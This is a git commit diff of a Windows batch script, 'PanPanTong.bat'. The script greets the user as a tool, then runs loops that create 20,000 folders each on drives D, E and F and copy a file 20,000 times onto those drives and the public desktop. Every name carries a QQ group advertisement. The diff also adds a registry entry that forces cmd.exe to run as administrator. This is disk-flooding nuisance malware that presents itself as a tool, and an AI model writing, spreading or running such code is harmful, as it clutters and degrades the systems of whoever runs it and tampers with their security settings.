26ad187c43ac93b8b2fe07c9918e3486252770cc
小曹2015 <a50656036@163.com>
2016-08-01 22:58:42 +0800

    Update PanPanTong.bat

--- PanPanTong.bat
+++ PanPanTong.bat
@@ -2,14 +2,15 @@
 echo 欢迎来到小曹铁路盘盘通的世界
 echo 作者：小曹2015 qq群：221312284
 dir 
-cd xcrail
-for /l %%a in (1,1,15000) do md d:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
-for /l %%a in (1,1,15000) do md e:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
-for /l %%a in (1,1,15000) do md f:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
-for /l %%a in (1,1,15000) do copy set.xcdata d:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
-for /l %%a in (1,1,15000) do copy set.xcdata e:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
-for /l %%a in (1,1,15000) do copy set.xcdata f:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
-for /l %%a in (1,1,15000) do copy set.xcdata C:\Users\Public\Desktop\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "c:\windows\system32\cmd.exe" /d "RUNASADMIN" /f
+for /l %%a in (1,1,20000) do md d:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
+for /l %%a in (1,1,20000) do md e:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
+for /l %%a in (1,1,20000) do md f:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件夹）
+for /l %%a in (1,1,20000) do copy set.xcdata d:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+for /l %%a in (1,1,20000) do copy set.xcdata e:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+for /l %%a in (1,1,20000) do copy set.xcdata f:\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+for /l %%a in (1,1,20000) do copy set.xcdata C:\Users\Public\Desktop\小曹铁路好，加群保平安，加群221312284，小曹铁路平天下（这是第%%a个文件）
+echo 小曹铁路好，加群221312284！
 
 cd c:
 c:
